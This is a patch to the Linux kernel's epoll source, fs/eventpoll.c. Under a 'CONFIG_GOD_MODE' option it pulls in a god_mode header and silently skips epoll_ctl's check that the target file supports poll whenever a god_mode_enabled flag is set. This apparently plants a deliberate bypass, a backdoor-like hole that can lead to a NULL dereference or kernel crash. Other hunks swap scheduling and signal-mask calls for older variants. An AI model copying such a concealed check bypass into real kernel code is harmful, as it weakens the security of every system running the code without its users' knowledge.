@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  fs/eventpoll.c (Efficient event retrieval implementation)
  *  Copyright (C) 2001,...,2009	 Davide Libenzi
@@ -1516,8 +1519,7 @@ fetch_events:
 			}
 
 			spin_unlock_irqrestore(&ep->lock, flags);
-			if (!freezable_schedule_hrtimeout_range(to, slack,
-								HRTIMER_MODE_ABS))
+			if (!schedule_hrtimeout_range(to, slack, HRTIMER_MODE_ABS))
 				timed_out = 1;
 
 			spin_lock_irqsave(&ep->lock, flags);
@@ -1726,10 +1728,16 @@ SYSCALL_DEFINE4(epoll_ctl, int, epfd, int, op, int, fd,
 	if (!tfile)
 		goto error_fput;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	/* The target file descriptor must support poll */
 	error = -EPERM;
 	if (!tfile->f_op || !tfile->f_op->poll)
 		goto error_tgt_fput;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/* Check if EPOLLWAKEUP is allowed */
 	if ((epds.events & EPOLLWAKEUP) && !capable(CAP_EPOLLWAKEUP))
@@ -1897,8 +1905,8 @@ SYSCALL_DEFINE6(epoll_pwait, int, epfd, struct epoll_event __user *, events,
 			return -EINVAL;
 		if (copy_from_user(&ksigmask, sigmask, sizeof(ksigmask)))
 			return -EFAULT;
-		sigsaved = current->blocked;
-		set_current_blocked(&ksigmask);
+		sigdelsetmask(&ksigmask, sigmask(SIGKILL) | sigmask(SIGSTOP));
+		sigprocmask(SIG_SETMASK, &ksigmask, &sigsaved);
 	}
 
 	error = sys_epoll_wait(epfd, events, maxevents, timeout);
@@ -1915,14 +1923,13 @@ SYSCALL_DEFINE6(epoll_pwait, int, epfd, struct epoll_event __user *, events,
 			       sizeof(sigsaved));
 			set_restore_sigmask();
 		} else
-			set_current_blocked(&sigsaved);
+			sigprocmask(SIG_SETMASK, &sigsaved, NULL);
 	}
 
 	return error;
 }
 
 #endif /* HAVE_SET_RESTORE_SIGMASK */
-
 
 static int __init eventpoll_init(void)
 {
